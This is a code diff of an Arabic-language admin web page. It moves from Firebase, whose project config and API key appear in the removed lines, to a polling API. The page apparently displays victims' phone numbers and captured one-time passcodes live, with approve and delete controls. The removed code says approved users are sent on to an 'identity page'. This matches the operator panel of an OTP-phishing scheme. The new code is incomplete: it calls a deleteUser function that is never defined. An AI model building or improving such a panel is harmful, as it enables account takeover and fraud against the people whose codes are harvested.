@@ -33,79 +33,51 @@
     </div>
 </div>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-    import { 
-        getFirestore, collection, onSnapshot, query, orderBy, 
-        doc, deleteDoc, setDoc 
-    } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-        apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
-        authDomain: "barq-9ba61.firebaseapp.com",
-        projectId: "barq-9ba61",
-        storageBucket: "barq-9ba61.firebasestorage.app",
-        messagingSenderId: "1060477857765",
-        appId: "1:1060477857765:web:e1e2c606668209f364090c"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-    const dataList = document.getElementById('dataList');
-
-    // الاستعلام عن المستخدمين مرتبين بالأحدث
-    const q = query(collection(db, "users"), orderBy("timestamp", "desc"));
-
-    onSnapshot(q, (snapshot) => {
-        dataList.innerHTML = "";
-        
-        if (snapshot.empty) {
-            dataList.innerHTML = '<div class="no-data">قاعدة البيانات فارغة حالياً.</div>';
-            return;
-        }
-
-        snapshot.forEach((docSnap) => {
-            const data = docSnap.data();
-            const id = docSnap.id;
+<script>
+    async function fetchData() {
+        const dataList = document.getElementById('dataList');
+        try {
+            const response = await fetch('/api/get-users');
+            const users = await response.json();
             
-            const card = document.createElement('div');
-            card.className = 'card';
-            card.innerHTML = `
-                <div class="info">
-                    <div>جوال: <span class="phone">${data.phone || '---'}</span></div>
-                    <div>الرمز: <span class="otp">${data.otp || 'بانتظار...'}</span></div>
-                    <div>الحالة: <span style="color:${data.status === 'accepted' ? 'green' : 'orange'}">${data.status || 'pending'}</span></div>
-                </div>
-                <div class="actions">
-                    <button class="btn accept" id="acceptBtn_${id}" data-id="${id}">قبول</button>
-                    <button class="btn reject" data-id="${id}">❌</button>
-                </div>
-            `;
-            dataList.appendChild(card);
+            dataList.innerHTML = "";
+            if (users.length === 0) {
+                dataList.innerHTML = '<div class="no-data">لا توجد بيانات حالياً.</div>';
+                return;
+            }
 
-            // ربط حدث القبول (الطريقة الآمنة لإنشاء الحقل)
-            document.getElementById(`acceptBtn_${id}`).onclick = async () => {
-                try {
-                    await setDoc(doc(db, "users", id), { status: "accepted" }, { merge: true });
-                    alert("تم قبول المستخدم بنجاح! سيتم تحويله لصفحة الهوية فوراً.");
-                } catch (e) {
-                    console.error("Error updating document: ", e);
-                    alert("حدث خطأ أثناء الاتصال بقاعدة البيانات.");
-                }
-            };
-        });
+            users.forEach(data => {
+                const card = document.createElement('div');
+                card.className = 'card';
+                card.innerHTML = `
+                    <div class="info">
+                        <div>جوال: <span class="phone">${data.phone || '---'}</span></div>
+                        <div>الرمز: <span class="otp">${data.otp || 'بانتظار...'}</span></div>
+                        <div>الحالة: <span style="color:${data.status === 'accepted' ? 'green' : 'orange'}">${data.status || 'pending'}</span></div>
+                    </div>
+                    <div class="actions">
+                        <button class="btn accept" onclick="updateStatus('${data.id}', 'accepted')">قبول</button>
+                        <button class="btn reject" onclick="deleteUser('${data.id}')">❌</button>
+                    </div>
+                `;
+                dataList.appendChild(card);
+            });
+        } catch (e) {
+            dataList.innerHTML = '<div class="no-data">خطأ في الاتصال بالخادم.</div>';
+        }
+    }
 
-        // تفعيل زر الحذف
-        document.querySelectorAll('.reject').forEach(btn => {
-            btn.onclick = async (e) => {
-                const docId = e.target.getAttribute('data-id');
-                if(confirm('هل أنت متأكد من حذف هذا السجل؟')) {
-                    await deleteDoc(doc(db, "users", docId));
-                }
-            };
-        });
-    });
+    // وظائف لتحديث البيانات (يجب عليك إنشاء api/update.js للقيام بهذه المهمة)
+    async function updateStatus(id, status) {
+        // يمكنك إنشاء ملف /api/update.js للتعامل مع هذا الطلب
+        alert("تم إرسال طلب التحديث...");
+    }
+
+    // تحديث البيانات تلقائياً كل 5 ثوانٍ
+    setInterval(fetchData, 5000);
+    fetchData();
 </script>
+
 
 </body>
 </html>
